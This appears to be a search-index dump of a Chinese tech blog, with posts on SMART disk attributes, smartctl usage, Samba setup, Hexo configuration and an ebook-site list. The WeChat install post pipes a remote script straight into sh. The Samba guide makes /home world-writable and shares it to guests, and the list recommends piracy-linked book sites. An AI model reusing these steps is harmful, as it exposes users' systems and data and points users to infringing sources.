温度的数据值直接表示了硬盘内部的当前温度。硬盘运行时最好不要超过45℃，温度过高虽不会导致数据丢失，但引起的机械变形会导致寻道与读写错误率上升，降低硬盘性能。硬盘的最高允许运行温度可查看硬盘厂商给出的数据，一般不会超过60℃。 \n 不同厂家对温度参数的当前值、最差值和临界值有不同的表示方法：希捷公司某些硬盘的当前值就是实际温度（摄氏）值，最差值则是曾经达到过的最高温度，临界值不具意义；而西部数据公司一些硬盘的最差值是温度上升到某值后的时间函数，每次升温后的持续时间都将导致最差值逐渐下降，当前值则与当前温度成反比，即当前温度越高，当前值越低，随实际温度波动。\n\n**C3（195）硬件ECC校正 Hardware ECC Recovered** \n ECC（Error Correcting Code）的意思是“错误检查和纠正”，这个技术能够容许错误，并可以将错误更正，使读写操作得以持续进行，不致因错误而中断。这一项的数据值记录了磁头在盘片上读写时通过ECC技术校正错误的次数，不过许多硬盘有其制造商特定的数据结构，因此数据量的大小并不能直接说明问题。 \n C3（195）实时无法校正错误计数 On the fly ECC Uncorrectable Error Count \n 这一参数记录了无法校正（UECC）的错误数量。 \n C3（195）编程错误块计数 Program Failure block Count（Indilinx芯片）\n\n**C4（196）重映射事件计数 Reallocetion Events Count** \n 数据应为0，当前值应远大于临界值。 \n 这个参数的数据值记录了将重映射扇区的数据转移到备用扇区的尝试次数，是重映射操作的累计值，成功的转移和不成功的转移都会被计数。因此这一参数与重映射扇区计数（05）相似，都是反映硬盘已经存在不良扇区。 \n C4（196）擦除错误块计数 Erase Failure block Count（Indilinx芯片） \n 在固态硬盘中，这一参数记录了被重映射的块编程失败的数量。\n\n**C5（197）当前待映射扇区计数 Current Pending Sector Count** \n 数据应为0，当前值应远大于临界值。 \n 这个参数的数据表示了“不稳定的”扇区数，即等待被映射的扇区（也称“被挂起的扇区”）数量。如果不稳定的扇区随后被读写成功，该扇区就不再列入等待范围，数据值就会下降。 \n 仅仅读取时出错的扇区并不会导致重映射，只是被列入“等待”，也许以后读取就没有问题，所以只有在写入失败时才会发生重映射。下次对该扇区写入时如果继续出错，就会产生一次重映射操作，此时重映射扇区计数（05）与重映射事件计数（C4）的数据值增加，此参数的数据值下降。 \n C5（197）读取错误块计数（不可修复错误）Read Failure block Count（Indilinx芯片）\n\n**C6（198）脱机无法校正的扇区计数 Offline Uncorrectable Sector Count** \n 数据应为0，当前值应远大于临界值。 \n 这个参数的数据累计了读写扇区时发生的无法校正的错误总数。数据值上升表明盘片表面介质或机械子系统出现问题，有些扇区肯定已经不能读取，如果有文件正在使用这些扇区，操作系统会返回读盘错误的信息。下一次写操作时会对该扇区执行重映射。 \n C6（198）总读取页数 Total Count of Read Sectors（Indilinx芯片）\n\n**C7（199）Ultra ATA访问校验错误率 Ultra ATA CRC Error Rate** \n 这个参数的数据值累计了通过接口循环冗余校验（Interface Cyclic Redundancy Check，ICRC）发现的数据线传输错误的次数。如果数据值不为0且持续增长，表示硬盘控制器→数据线→硬盘接口出现错误，劣质的数据线、接口接触不良都可能导致此现象。由于这一项的数据值不会复零，所以某些新硬盘也会出现一定的数据量，只要更换数据线后数据值不再继续增长，即表示问题已得到解决。 \n C7（199）总写入页数 Total Count of Write Sectors（Indilinx芯片）\n\n**C8（200）写入错误率 Write Error Rate / 多区域错误率 Multi-Zone Error Rate（西部数据）** \n 数据应为0，当前值应远大于临界值。 \n 这个参数的数据累计了向扇区写入数据时出现错误的总数。有的新硬盘也会有一定的数据量，若数据值持续快速升高（当前值偏低），表示盘片、磁头组件可能有问题。 \n C8（200）总读取指令数 Total Count of Read Command（Indilinx芯片）\n\n**C9（201）脱道错误率 Off Track Error Rate / 逻辑读取错误率 Soft Read Error Rate** \n 数据值累积了读取时脱轨的错误数量，如果数据值不为0，最好备份硬盘上的资料。 \n C9（201）TA Counter Detected（意义不明） \n C9（201）写入指令总数 Total Count of Write Command（Indilinx芯片）\n\n**CA（202）数据地址标记错误 Data Address Mark errors** \n 此项的数据值越低越好（或者由制造商定义）。 \n CA（202）TA Counter Increased（意义不明） \n CA（202）剩余寿命 Percentage Of The Rated Lifetime Used（Micron 镁光芯片） \n 当前值从100开始下降至0，表示所有块的擦写余量统计。计算方法是以MLC擦写次数除以50，SLC擦写次数除以1000，结果取整数，将其与100的差值作为当前值（MLC预计擦写次数为5000，SLC预计擦写次数为100000）。 \n CA（202）闪存总错误bit数 Total Count of error bits from flash（Indilinx芯片）\n\n**CB（203）软件ECC错误数 Run Out Cancel** \n 错误检查和纠正（ECC）出错的频度。 \n CB（203）校正bit错误的总读取页数 Total Count of Read Sectors with correct bits error（Indilinx芯片）\n\n**CC（204）软件ECC校正 Soft ECC Correction** \n 通过软件ECC纠正错误的计数。 \n CC（204）坏块满标志 Bad Block Full Flag（Indilinx芯片）\n\n**CD（205）热骚动错误率 Thermal Asperity Rate (TAR)** \n 由超温导致的错误。数据值应为0。 \n CD（205）最大可编程/擦除次数 Max P/E Count（Indilinx芯片）\n\n**CE（206）磁头飞行高度 Flying Height** \n 磁头距离盘片表面的垂直距离。高度过低则增加了磁头与盘片接触导致损坏的可能性；高度偏高则增大了读写错误率。不过准确地说，硬盘中并没有任何装置可以直接测出磁头的飞行高度，制造商也只是根据磁头读取的信号强度来推算磁头飞行高度。 \n CE（206）底层数据写入出错率 Write Error Rate \n CE（206）最小擦写次数 Erase Count Min（Indilinx芯片）\n\n**CF（207）主轴过电流 Spin High Current** \n 数据值记录了主轴电机运行时出现浪涌电流的次数，数据量的增加意味着轴承或电机可能有问题。 \n CF（207）最大擦写次数 Erase Count Max（Indilinx芯片）\n\n**D0（208）主轴电机重启次数 Spin Buzz** \n 数据值记录了主轴电机反复尝试启动的次数，这通常是由于电源供电不足引起的。 \n D0（208）平均擦写次数Erase Count Average（Indilinx芯片）\n\n**D1（209）脱机寻道性能 Offline Seek Performance** \n 这一项表示驱动器在脱机状态下的寻道性能，通常用于工厂内部测试。 \n D1（209）剩余寿命百分比 Remaining Life %（Indilinx芯片）\n\n**D2（210）斜坡加载值 Ramp Load Value** \n 这一项仅见于几年前迈拓制造的部分硬盘。通常数据值为0，意义不明。 \n D2（210）坏块管理错误日志 BBM Error Log（Indilinx芯片）\n\n**D3（211）写入时振动 Vibration During Write** \n 写入数据时受到受到外部振动的记录。 \n D3（211）SATA主机接口CRC写入错误计数 SATA Error Count CRC (Write)（Indilinx芯片）\n\n**D4（212）写入时冲击 Shock During Write** \n 写入数据时受到受到外部机械冲击的记录。 \n D4（212）SATA主机接口读取错误计数 SATA Error Count Count CRC (Read)（Indilinx芯片）\n\n**DC（220）盘片偏移量 Disk Shift** \n 硬盘中的盘片相对主轴的偏移量（通常是受外力冲击或温度变化所致），单位未知，数据值越小越好。\n\n**DD（221）冲击错误率 G-sense error rate** \n 与（BF）相同，数据值记录了硬盘受到外部机械冲击或振动导致出错的频度。\n\n**DE（222）磁头寻道时间累计 Loaded Hours** \n 磁头臂组件运行的小时数，即寻道电机运行时间累计。\n\n**DF（223）磁头加载/卸载重试计数 Load/Unload Retry Count** \n 这一项与（C1）项类似，数据值累积了磁头尝试重新加载/卸载的次数。\n\n**E0（224）磁头阻力 Load Friction** \n 磁头工作时受到的机械部件的阻力。\n\n**E1****（****225****）主机写入数据量** **Host Writes** \n 由于闪存的擦写次数是有限的，所以这项是固态硬盘特有的统计。Intel的SSD是每当向硬盘写入了65536个扇区，这一项的数据就＋1。如果用HDTune等软件查看SMART时可以自己计算，[Intel SSD Toolbox](http://downloadcenter.intel.com/Detail_Desc.aspx?agr=Y&DwnldID=18455&lang=zho)已经为你算好了，直接就显示了曾向SSD中写入过的数据量。\n\n**E2（226）磁头加载时间累计 Load 'In'-time** \n 磁头组件运行时间的累积数，即磁头臂不在停靠区的时间，与（DE）项相似。\n\n**E3（227）扭矩放大计数 Torque Amplification Count** \n 主轴电机试图提高扭矩来补偿盘片转速变化的次数。当主轴轴承存在问题时，主轴电机会尝试增加驱动力使盘片稳定旋转。这个参数的当前值下降，说明硬盘的机械子系统出现了严重的问题。\n\n**E4（228）断电返回计数 Power-Off Retract Cycle** \n 数据值累计了磁头因设备意外断电而自动返回的次数，与（C0）项相似。\n\n**E6（230）GMR磁头振幅 GMR Head Amplitude** \n 磁头“抖动”，即正向/反向往复运动的距离。\n\n**E7（231）温度 Temperature** \n 温度的数据值直接表示了硬盘内部的当前温度，与（C2）项相同。 \n**E7（231）剩余寿命 SSD Life Left** \n 剩余寿命是基于P/E周期与可用的备用块作出的预测。新硬盘为100；10表示PE周期已到设计值，但尚有足够的保留块；0表示保留块不足，硬盘将处于只读方式以便备份数据。\n\n**E8（232）寿命余量 Endurance Remaining** \n 寿命余量是指硬盘已擦写次数与设计最大可擦写次数的百分比，与（CA）项相似。 \n E8（232）预留空间剩余量 Available Reserved Space（Intel芯片） \n 对于Intel的SSD来说，前边05项提到会保留一些容量来准备替换损坏的存储单元，所以可用的预留空间数非常重要。当保留的空间用尽，再出现损坏的单元就将出现数据丢失，这个SSD的寿命就结束了。所以仅看05项意义并不大，这一项才最重要。这项参数可以看当前值，新的SSD里所有的预留空间都在，所以是100。随着预留空间的消耗，当前值将不断下降，减小到接近临界值（一般是10）时，就说明只剩下10%的预留空间了，SSD的寿命将要结束。这个与（B4）项相似。\n\n**E9（233）通电时间累计 Power-On Hours** \n 对于普通硬盘来说，这一项与（09）相同。 \n E9（233）介质磨耗指数 Media Wareout Indicator（Intel芯片） \n 由于固态硬盘的擦写次数是有限的，当到达一定次数的时候，就会出现大量的单元同时损坏，这时候预留空间也顶不住了，所以这项参数实际上表示的是硬盘设计寿命。Intel的SSD要看当前值，随着NAND的平均擦写次数从0增长到最大的设计值，这一参数的当前值从开始的100逐渐下降至1为止。这表示SSD的设计寿命已经终结。当然到达设计寿命也不一定意味着SSD就立即报废，这与闪存芯片的品质有着很大的关系。\n\n注：Total Erase Count全擦写计数是指固态硬盘中所有块的擦写次数的总和，不同规格的NAND芯片以及不同容量的SSD，其最大全擦写次数均有所不同。\n\n**F0（240）磁头飞行时间 Head Flying Hours / 传输错误率 Transfer Error Rate（富士通）** \n 磁头位于工作位置的时间。 \n 富士通硬盘表示在数据传输时连接被重置的次数。\n\n**F1（241）LBA写入总数 Total LBAs Written** \n LBA写入数的累计。 \n F1（241）写入剩余寿命 Lifetime Writes from Host \n 自硬盘启用后主机向硬盘写入的数据总量，以4个字节表示，每写入64GB字节作为一个单位。\n\n**F2（242）LBA读取总数 Total LBAs Read** \n LBA读取数的累计。某些SMART读取工具会显示负的数据值，是因为采用了48位LBA，而不是32位LBA。 \n F2（242）读取剩余寿命 Lifetime Reads from Host \n 自硬盘启用后主机从硬盘读取的数据总量，以4个字节表示，每读取64GB字节作为一个单位。\n\n**FA（250）读取错误重试率 Read Error Retry Rate** \n 从磁盘上读取时出错的次数。\n\n**FE（254）自由坠落保护 Free Fall Protection**\n 现在有些笔记本硬盘具有自由坠落保护功能，当硬盘内置的加速度探测装置检测到硬盘位移时，会立即停止读写操作，将磁头臂复位。这个措施防止了磁头与盘片之间发生摩擦撞击，提高了硬盘的抗震性能。这个参数的数据里记录了这一保护装置动作的次数。","tags":["硬盘自检","smartctl"],"categories":["运维"]},{"title":"硬盘自检工具-smartctl的使用","url":"/20210518/88d6c7c0b6a9/","content":"\n本文转自：https://www.cnblogs.com/zk47/p/4753615.html\n\n## 1. 是什么\n\n常用的磁盘检查工具，smart(Self-Monitoring,Analysis and Reporting Technology)\n\n## 2. 安装\n\n### (1)ubuntu\n\n$ sudo apt-get install smartmontools\n \n\n### (2)rhat & Centos\n\n$ yum install smartmontools\n \n\n## 3. 使用\n\n### (1) 看磁盘是否支持smartctl\n\n$ sudo smartctl -i /dev/sda1 \n smartctl 6.2 2013-07-26 r3841 [x86_64-linux-2.6.18-164.11.1.el5] (local build)\n Copyright (C) 2002-13, Bruce Allen, Christian Franke, [www.smartmontools.org](http://www.smartmontools.org)\n \n === START OF INFORMATION SECTION ===\n Model Family:   Seagate Constellation ES (SATA 6Gb/s)\n Device Model:   ST1000NM0011\n Serial Number:  Z1N0EVRZ\n LU WWN Device Id: 5 000c50 03f123968\n Firmware Version: SN02\n User Capacity:  1,000,204,886,016 bytes [1.00 TB]\n Sector Size:   512 bytes logical/physical\n Rotation Rate:  7202 rpm\n Device is:    In smartctl database [for details use: -P show]\n ATA Version is:  ATA8-ACS T13/1699-D revision 4\n SATA Version is: SATA 3.0, 6.0 Gb/s (current: 3.0 Gb/s)\n Local Time is:  Sun Aug 23 23:27:54 2015 CST\n SMART support is: Available - device has SMART capability.     \n SMART support is: Enabled\n \n\n最后两行给出了是否支持smartctl\n\n## (2)手动开启支持smartctl\n\n$ smartctl --smart=on --offlineauto=on --saveauto=on /dev/sda1\n \n\n各个参数意思如下：\n\n-s VALUE, --smart=VALUE\n Enable/disable SMART on device (on/off)\n\n-o VALUE, --offlineauto=VALUE (ATA)\n Enable/disable automatic offline testing on device (on/off)\n\n-S VALUE, --saveauto=VALUE (ATA)\n Enable/disable Attribute autosave on device (on/off)\n\n## (3)检查磁盘的健康状况\n\n$ sudo smartctl -H /dev/sda1 \n smartctl 6.2 2013-07-26 r3841 [x86_64-linux-2.6.18-164.11.1.el5] (local build)\n Copyright (C) 2002-13, Bruce Allen, Christian Franke, [www.smartmontools.org](http://www.smartmontools.org)\n \n === START OF READ SMART DATA SECTION ===\n SMART overall-health self-assessment test result: PASSED\n \n\n## (4)显示磁盘的属性值\n\n$ sudo smartctl -A /dev/sdl1\n smartctl 6.2 2013-07-26 r3841 [x86_64-linux-2.6.18-164.11.1.el5] (local build)\n Copyright (C) 2002-13, Bruce Allen, Christian Franke, [www.smartmontools.org](http://www.smartmontools.org)\n \n === START OF READ SMART DATA SECTION ===\n SMART Attributes Data Structure revision number: 10\n Vendor Specific SMART Attributes with Thresholds:\n ID# ATTRIBUTE_NAME     FLAG   VALUE WORST THRESH TYPE   UPDATED WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate   0x000f  084  063  044  Pre-fail Always    -    238687534\n  3 Spin_Up_Time      0x0003  099  099  000  Pre-fail Always    -    0\n  4 Start_Stop_Count    0x0032  100  100  020  Old_age  Always    -    3\n  5 Reallocated_Sector_Ct  0x0033  100  100  036  Pre-fail Always    -    0\n  7 Seek_Error_Rate     0x000f  087  060  030  Pre-fail Always    -    573183052\n  9 Power_On_Hours     0x0032  063  063  000  Old_age  Always    -    33120\n 10 Spin_Retry_Count    0x0013  100  100  097  Pre-fail Always    -    0\n 12 Power_Cycle_Count    0x0032  100  100  020  Old_age  Always    -    3\n 184 End-to-End_Error    0x0032  100  100  099  Old_age  Always    -    0\n 187 Reported_Uncorrect   0x0032  100  100  000  Old_age  Always    -    0\n 188 Command_Timeout     0x0032  100  100  000  Old_age  Always    -    0\n 189 High_Fly_Writes     0x003a  100  100  000  Old_age  Always    -    0\n 190 Airflow_Temperature_Cel 0x0022  075  049  045  Old_age  Always    -    25 (Min/Max 20/30)\n 191 G-Sense_Error_Rate   0x0032  100  100  000  Old_age  Always    -    0\n 192 Power-Off_Retract_Count 0x0032  100  100  000  Old_age  Always    -    1\n 193 Load_Cycle_Count    0x0032  100  100  000  Old_age  Always    -    567\n 194 Temperature_Celsius   0x0022  025  051  000  Old_age  Always    -    25 (0 20 0 0 0)\n 195 Hardware_ECC_Recovered 0x001a  120  099  000  Old_age  Always    -    238687534\n 197 Current_Pending_Sector 0x0012  100  100  000  Old_age  Always    -    2\n 198 Offline_Uncorrectable  0x0010  100  100  000  Old_age  Offline   -    2\n 199 UDMA_CRC_Error_Count  0x003e  200  200  000  Old_age  Always    -    0\n \n\n基本上，SMART属性表列出了制造商在硬盘中定义好的属性值，以及这些属性相关的故障阈值。这个表由驱动固件自动生成和更新。\n\n- ID: 属性值，通常是1到255之间的十进制数字\n- ATTRIBUTE_NAME：制造商定义的属性值\n- VALUE：这是表格中最重要的信息之一，代表给定属性的标准化值，在1到253之间。253意味着最好情况，1意味着最坏情况。取决于属性和制造商，初始化VALUE可以被设置成100或200.\n- FLAG：属性操作标志\n- THRESH: 在报告硬盘FAILED状态前，WORST可以允许的最小值\n- TYPE: 属性的类型(Pre-fail或Oldage)。Pre-fail类型的属性可被看成一个关键属性，表示参与磁盘的整体SMART健康评估(PASSED/FAILED)。如果任何Pre-fail类型的属性故障，那么可视为磁盘将要发生故障。另一方面，Oldage类型的属性可被看成一个非关键的属性(如正常的磁盘磨损)，表示不会使磁盘本身发生故障。\n- UPDATED: 表示属性的更新频率。Offline代表磁盘上执行离线测试的时间。\n- WHEN_FAILED: 如果VALUE小于等于THRESH，会被设置成“FAILING_NOW”；如果WORST小于等于THRESH会被设置成“In_the_past”；如果都不是，会被设置成“-”。在“FAILING_NOW”情况下，需要尽快备份重要文件，特别是属性是Pre-fail类型时。“In_the_past”代表属性已经故障了，但在运行测试的时候没问题。“-”代表这个属性从没故障过。\n- RAW_VALUE: 制造商定义的原始值，从VALUE派生。\n\n### (5)测试磁盘\n\n- short 测试\n\n$ sudo smartctl -t short /dev/sda\n smartctl 6.2 2013-07-26 r3841 [x86_64-linux-2.6.18-164.11.1.el5] (local build)\n Copyright (C) 2002-13, Bruce Allen, Christian Franke, [www.smartmontools.org](http://www.smartmontools.org)\n \n === START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION ===\n Sending command: \"Execute SMART Short self-test routine immediately in off-line mode\".\n Drive command \"Execute SMART Short self-test routine immediately in off-line mode\" successful.\n Testing has begun.\n Please wait 1 minutes for test to complete.\n Test will complete after Mon Aug 24 00:01:22 2015\n \n Use smartctl -X to abort test.\n \n\n- long测试\n\n$ sudo smartctl -t long /dev/sda\n \n\n- 看测试进度\n\n$ sudo smartctl -l selftest /dev/sda\n smartctl 6.2 2013-07-26 r3841 [x86_64-linux-2.6.18-164.11.1.el5] (local build)\n Copyright (C) 2002-13, Bruce Allen, Christian Franke, [www.smartmontools.org](http://www.smartmontools.org)\n \n === START OF READ SMART DATA SECTION ===\n SMART Self-test log structure revision number 1\n Num Test_Description  Status         Remaining LifeTime(hours) LBA_of_first_error\n \\# 1 Short offline    Completed without error    00%   33120     -\n \n\n- 停止测试\n\n$ sudo smartctl -X /dev/sda\n smartctl 6.2 2013-07-26 r3841 [x86_64-linux-2.6.18-164.11.1.el5] (local build)\n Copyright (C) 2002-13, Bruce Allen, Christian Franke, [www.smartmontools.org](http://www.smartmontools.org)\n\n === START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION ===\n Sending command: \"Abort SMART off-line mode self-test routine\".\n Self-testing aborted!\n\n## 参考：\n\n(1) [http://linux.cn/article-4682-1.html ](http://linux.cn/article-4682-1.html) \n(2) [http://xmodulo.com/check-hard-disk-health-linux-smartmontools.html ](http://xmodulo.com/check-hard-disk-health-linux-smartmontools.html) \n(3) [http://chaorenyong.blog.51cto.com/2163445/1051859 ](http://chaorenyong.blog.51cto.com/2163445/1051859) \n(4) [http://bbs.chinaunix.net/thread-4132241-1-1.html](http://bbs.chinaunix.net/thread-4132241-1-1.html)","tags":["Linux","硬盘自检","smartctl"],"categories":["运维"]},{"title":"其他发行版安装deepin 微信","url":"/20210516/2c8beade47c0/","content":"\n运行命令：\n\n```shell\nwget -O- https://deepin-wine.i-m.dev/setup.sh | sh\nsudo apt install deepin.com.wechat\n```\n\n安装后可能会出现界面中文字体显示方块的问题，解决方案如下：\n\n```shell​\n$ sudo apt-cache search wqy \nfonts-wqy-microhei - Sans-serif style CJK font derived from Droid\nfonts-wqy-zenhei - \"WenQuanYi Zen Hei\" A Hei-Ti Style (sans-serif) Chinese font\nxfonts-wqy - WenQuanYi Bitmap Song CJK font for X\n# 安装上面三个字体\nsudo apt install fonts-wqy-microhei\n```\n\n","tags":["Deepin"],"categories":["日常"]},{"title":"电子书网站大全","url":"/20210516/49241dee71b7/","content":"\n|**网站名称**|**地址**|**简介**|**语言**|**推荐指数**|\n|----------------------|:-----------------------------------------------------------|------------------------------------------------------------|---------|------------|\n|BookYards|https://www.bookyards.com/en/welcome|主要面向教师的门户网站，免费提供，教辅资料最多。|英语|★★★|\n|搬书匠|http://www.banshujiang.cn/|主要提供编程类书籍的下载|中文|★★★|\n|Z-Library|https://z-lib.org/|无|英语|★★★★|\n|Iread|http://www.iread.cf/|网站不对外搜索引擎开放，站内的资源只能通过站内搜索搜到，要登录|中文|★★★|\n|我爱书籍|http://www.52book.me/|分类详细，书还算比较齐全|中文|★★★|\n|伴读|https://www.bandubook.com/|一个电子书百度云资源专搜网站|中文|★★★|\n|书享家|http://shuxiangjia.cn/|整合了上百个电子书下载网站|中文|★★★|\n|鸠摩搜索|https://www.jiumodiary.com/|强推！专业搜书的聚合搜索引擎|中文/英文|★★★★★|\n|每日书单|https://shudan.vip/|主页界面不错，分类放置资源的形式很适合不知道看什么书的人随便逛逛。|中文|★★★★★|\n|ePUBee电子书库|http://cn.epubee.com/books/|电子书版本、格式都很多，可以一键添加进网站个人账户，再进行下载。|中文|★★★★|\n|Z-Library|https://z-lib.org/|喜欢看英文原版的推荐使用，下载的电子书是mobi、epub格式。|英语|★★★★|\n|LibraryGenesis|http://gen.lib.rus.ec/|功能很强大的下载网站，收录各大下载网站，|英语|★★★★★|\n|ProjectGutenberg|http://www.gutenberg.org/ebooks/4351|对电子书的分类非常细致，但似乎电子书比较旧|英语|★★★|\n|LibgenOnlineLibrary|https://libgen.pw/search?q=A+brief+history+of+humankind|很简单直接的下载网站，电子书版本多，下载也比较方便|英语|★★★★|\n|文叔叔|https://www.wenshushu.cn/about|用来分享电子书非常方便，当然你也可以分享其它资源|中文|★★★★★|\n|BookSC|http://booksc.org/|无|英语|★★★|\n|苦瓜书盘|https://kgbook.com/|和我的小书屋差不多，现仅提供epub下载|中文|★★★★|\n|走读派|http://zoudupai.com/|kindle电子书资源|中文|★★★★|\n|西林街|https://xilinjie.cc/|聚合全网各种来源并分类，也是搜索引擎，不止有电子书，期刊、报纸等都可以搜索。|中文|★★★|\n|众人搜索网|http://www.renrensousuo.com/|除了电子书，一些学习资料、文献也可以搜到，功能比较多。|中文|★★★|\n|周读|http://www.ireadweek.com/|无|中文|★★★|\n|DigiLibraries|https://digilibraries.com/|英文下载，适合kindle|英语|★★★★|\n|书格|https://shuge.org/|可以看到一些旧典籍，很有格调的网站|中文|★★★|\n|蚂蚁搬书|http://www.mybanshu.com/|KindleMate官方网站，阅读极客的聚集地|中文|★★★★|\n|好读|http://www.haodoo.net/|无|中文|★★★|\n|kindle漫画|http://www.kindlecomic.net/|高清kindle格式漫画下载|中文|★★★★|\n|古籍馆|https://www.gujiguan.com/|中国最大的古籍图书馆|中文|★★★|\n|亚马逊免费kindle电子书|https://www.amazon.cn/Kindle免费电子书/b?node=116175071|无|中文/英文|★★★★|\n|OpenLibrary|https://openlibrary.org/|英文原版书的免费电子资源|英语|★★★★|\n|Manybooks|http://manybooks.net|大部分英文原版书都是免费的|英语|★★★|\n|亿年书海|http://www.inien.com/w/#/Index|支持不同尺寸、格式的电子书下载|中文|★★★|\n|掌上书苑|https://www.soepub.com/|下载需要书币，电子书可以推送到kindle|中文|★★★|\n|七彩英语|http://www.qcenglish.com/|英文原版书下载|英语|★★★|\n|kindleshare|https://kindleshare.cn/|无|中文|★★★|\n|mlook|https://www.mlook.mobi/member/login|要登录|英语|★★★|\n|书单网|https://www.shudan.vip|网站收录了30多个电子书网站的下载资源|中文|★★★★|\n|Mobilism|https://forum.mobilism.org/viewforum.php?f=19|英文原版书下载，推荐|英语||\n","tags":["电子书"],"categories":["日常"]},{"title":"ubuntu 20.04 安装配置Samba服务","url":"/20210516/84e50033090b/","content":"\n文章转自：https://blog.csdn.net/mvp_Dawn/article/details/105847485\n\n## 1. 安装Samba服务\n```shell\nsudo apt-get install samba samba-common\n```\n\n如果安装失败，请检查你的网络，确认linux可以访问互联网，若可以联网请尝试更换ubuntu镜像源，桌面版直接在软件和更新中配置，服务器版百度上很多\n\n## 2. 配置需要共享的目录\n\n改变需要共享目录的权限，让其他人可以更改文件和目录，以/home为例（若多人使用同一服务器建议在每个用户家目录单独共享，不建议共享整个home目录，防止误操作删除他人文件）\n\n```shell\n$ sudo chmod 777 /home/ -R\n```\n\n## 3. 添加samba用户\n\n添加samba用户，用于其他人或设备认证，这里添加的用户需要在系统账号中存在，否则添加失败\n\n```shell\ndwan@ubuntu20:~/桌面$ sudo smbpasswd -a dwan\nNew SMB password:\nRetype new SMB password:\nAdded user dwan.\n```\n\n## 4. 配置samba\n\n先备份`sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.bak`，以防改错，修改配置文件时建议养成备份的好习惯，改错了还能恢复，`sudo vim /etc/samba/smb.conf` 修改配置，添加共享，可直接加到文件尾\n\n```shell\n[home] #共享名，该共享标签，可随意取，该名字为在其他电脑上看到的共享名\n    comment = home directories #该共享描述\n    path = /home/  #共享路径\n    public = yes   #指定该共享是否允许guest账户访问\n    writable = yes #writable用来指定该共享路径是否可写\n    workgroup = DAWN #设定 Samba Server 所要加入的工作组或者域\n```\n\nworkgroup 根据windows工作组来确定，右键我的电脑（win10为此电脑）->属性  工作组，该选项有的版本需要配置，有的版本不需要，若访问不了可检查一下该配置，更多配置详见samba配置详解\n\n![20200429205949812](20200429205949812.png)\n\n## 5. 重启samba服务\n\n```shell\nsudo service smbd restart\n```\n\n若找不到服务可尝试如下方法，不过得具体看，有的版本路径不是/etc/init.d/samba，比如我的为/etc/init.d/samba-ad-dc，可以看对应路径是啥，决定用哪个命令\n\n```shell\nsudo /etc/init.d/samba restart\n#sudo /etc/init.d/samba-ad-dc restart\n```\n\n## 6. 在Windows中访问samba服务\n\n在Windows文件管理器中输入`\\\\linux ip` 便可以看到linux samba服务共享的文件夹\n\n![20200429212054291](20200429212054291.png)\n\n## 7. 将共享路径映射为Windows磁盘（非必须）\n\n若经常使用的共享，可直接映射为Windows的磁盘，不用每次都输ip，但linux ip变了需要重新映射，所以建议将linux ip设为固定ip\n\n我的电脑 ->右键 ->映射网络驱动器，文件夹输入框输入\\\\linux ip\\共享名，不能直接输ip，一定要加上共享名，点击完成\n\n![20200429212606612](20200429212606612.png)\n\n接下来就可以在我的![20200429212828636](20200429212828636.png)电脑里看到映射的网络磁盘了\n\n\n\n接下来你就可以在Windows上编写代码，然后在linux下编译验证了\n\n \n\n引用：\n\nhttps://blog.csdn.net/weixin_40806910/article/details/81917077\n\n","tags":["samba"],"categories":["运维"]},{"title":"Hexo使用攻略-添加分类及标签","url":"/20210516/c11b8784ab95/","content":"\n文章转自: https://www.cnblogs.com/hankleo/p/11606224.html\n\n## 创建“分类”选项\n### 生成“分类”页并添加tpye属性\n打开命令行，进入博客所在文件夹。执行命令\n\n```shell\nhexo new page categories\n```\n\n成功后会提示：\n```\nINFO  Created: ~/Documents/blog/source/categories/index.md\n```\n根据上面的路径，找到index.md这个文件，打开后默认内容是这样的：\n```\n---\ntitle: 文章分类\ndate: 2017-05-27 13:47:40\n---\n```\n添加type: \"categories\"到内容中，添加后是这样的：\n```\n---\ntitle: 文章分类\ndate: 2017-05-27 13:47:40\ntype: \"categories\"\n---\n```\n\n保存并关闭文件。\n\n### 给文章添加`categories`属性\n\n打开需要添加分类的文章，为其添加`categories`属性。下方的`categories: web前端`表示添加这篇文章到`web前端`这个分类。\n\n注意：hexo一篇文章只能属于一个分类，也就是说如果在“- web前端”下方添加“-xxx”，hexo不会产生两个分类，而是把分类嵌套（即该文章属于 “- web前端”下的 “-xxx ”分类）。\n\n```\n---\ntitle: jQuery对表单的操作及更多应用\ndate: 2017-05-26 12:12:57\ncategories: \n- web前端\n---\n```\n\n至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。\n当然，只有添加了categories: xxx的文章才会被收录到首页的“分类”中。\n\n## 创建“标签”选项\n### 生成“标签”页并添加tpye属性\n打开命令行，进入博客所在文件夹。执行命令\n\n```shell\nhexo new page tags\n```\n\n成功后会提示：\n```\nINFO  Created: ~/Documents/blog/source/tags/index.md\n```\n根据上面的路径，找到`index.md`这个文件，打开后默认内容是这样的：\n\n```\n---\ntitle: 标签\ndate: 2017-05-27 14:22:08\n---\n``` \n添加type: \"tags\"到内容中，添加后是这样的：\n\n```\n---\ntitle: 文章分类\ndate: 2017-05-27 13:47:40\ntype: \"tags\"\n---\n```\n\n保存并关闭文件。\n\n### 给文章添加“tags”属性\n打开需要添加标签的文章，为其添加`tags`属性。下方的`tags`:下方的`- jQuery-表格-`表单验证就是这篇文章的标签了\n\n```\n---\ntitle: jQuery对表单的操作及更多应用\ndate: 2017-05-26 12:12:57\ncategories: \n- web前端\ntags:\n- jQuery\n- 表格\n- 表单验证\n---\n```\n\n至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。\n 当然，只有添加了`tags: xxx`的文章才会被收录到首页的“标签”中。\n","tags":["Hexo"],"categories":["运维"]},{"title":"Hexo插入本地图片","url":"/20210515/30fb6e5d076a/","content":"\n## Hexo引入本地图片\nHexo本身已经可以插入本地图片，但是其使用的并非我所熟悉的markdown语法：\n\n### 文章资源文件夹\n对于那些想要更有规律地提供图片和其他资源以及想要将他们的资源分布在各个文章上的人来说，Hexo也提供了更组织化的方式来管理资源。这个稍微有些复杂但是管理资源非常方便的功能可以通过将 `config.yml` 文件中的 `post_asset_folder` 选项设为 `true` 来打开。\n\n```yml\n# _config.yml\npost_asset_folder: true\n```\n当资源文件管理功能打开后，Hexo将会在你每一次通过 `hexo new [layout] <title>` 命令创建新文章时自动创建一个文件夹。这个资源文件夹将会有与这个文章文件一样的名字。将所有与你的文章有关的资源放在这个关联文件夹中之后，你可以通过相对路径来引用它们，这样你就得到了一个更简单而且方便得多的工作流。\n\n### 相对路径引用的标签插件\n通过常规的 markdown 